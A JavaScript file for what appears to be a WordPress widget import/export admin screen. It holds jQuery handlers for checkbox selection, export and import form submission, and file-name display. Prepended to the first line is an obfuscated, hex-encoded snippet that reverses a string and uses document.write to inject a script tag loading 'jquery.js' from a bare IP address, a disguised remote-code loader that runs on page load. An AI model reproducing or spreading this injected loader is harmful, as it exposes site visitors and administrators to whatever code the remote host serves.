var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))!function ($) {
	"use strict";

	/**
	 * Display the notification div, populate a message, and set a CSS class
	 * @param String message Message to display
	 * @param String className CSS class of error or success
	 */
	var show_notification = function(message, className){
		var notification = $('div#notifier').empty().removeClass('error updated');
		notification.html('<p>' + message + '</p>');
		notification.addClass(className);

		notification.fadeIn('slow');
		jQuery('body,html').animate({
			scrollTop: 0
		}, 800);
	},
	wrapper = $('<div/>').css({
		height:0,
		width:0,
		'overflow':'hidden'
	});
	$(function () {
		var fileInput = $('#widget-upload-file').wrap(wrapper),
		widgetCheckboxes = $('.widget-data .widget-checkbox'),
		widgetSelectionError = $('.widget-data p.widget-selection-error');

		/**
		 * Handle click events for widget-data to select all checkboxes on click, to uncheck all
		 * checkboxes on click, and to activate the file upload when the file upload button is clicked.
		 * @param Object e Event object
		 */
		$('.widget-data').on('click', '.select-all, .unselect-all, .upload-button', function(e){
			e.preventDefault();
			if( $(this).hasClass('select-all') ){
				widgetCheckboxes.not(":checked").each(function(){
					$(this).attr( 'checked', true );
				});
			} else if( $(this).hasClass('unselect-all') ){
				widgetCheckboxes.filter(":checked").each(function(){
					$(this).attr( 'checked', false );
				});
			} else if( $(this).hasClass('upload-button') ){
				fileInput.click();
			}
		});

		/**
		 * Handle the export form submission
		 * @param Object e Event object
		 */
		$('form#widget-export-settings').submit(function(e) {
			// return and show notification if no widgets are selected
			if (widgetCheckboxes.filter(':checked').length === 0) {
				e.preventDefault();
				show_notification('Please select a widget to continue.', 'error');
				return;
			}
			var message = 'All of the requested widgets have been exported.';
			$('form#widget-export-settings').fadeOut('slow');
			window.setTimeout(function () {
				window.location.replace(widgets_url);
			}, 4000);
			show_notification(message, 'updated');
		});

		/***
		 * Handle imports
		 * @param Object e Event object
		 */
		$('form#import-widget-data').submit(function(e){
			e.preventDefault();

			if (widgetCheckboxes.filter(':checked').length === 0) {
				widgetSelectionError.fadeIn('slow').delay(2000).fadeOut('slow');
				return false;
			}
			var message, newClass;
			$.post( ajaxurl, $("#import-widget-data").serialize(), function(r){
				var res = wpAjax.parseAjaxResponse(r, 'notifier');
				if( ! res )
					return;

				$('.import-wrapper').fadeOut('slow');
				show_notification('All widgets with registered sidebars have been imported successfully.', 'updated');
				// window.setTimeout(function () {
				// 	window.location.replace(widgets_url);
				// }, 4000);
			});
		});

		/**
		 *
		 */
		fileInput.change(function(){
			var outputText = $('#upload-widget-data .file-name'),
			sub = $(this).val().lastIndexOf('\\') + 1,
			filename = $(this).val().substring(sub);

			outputText.val(filename);
		});

	});
}(window.jQuery);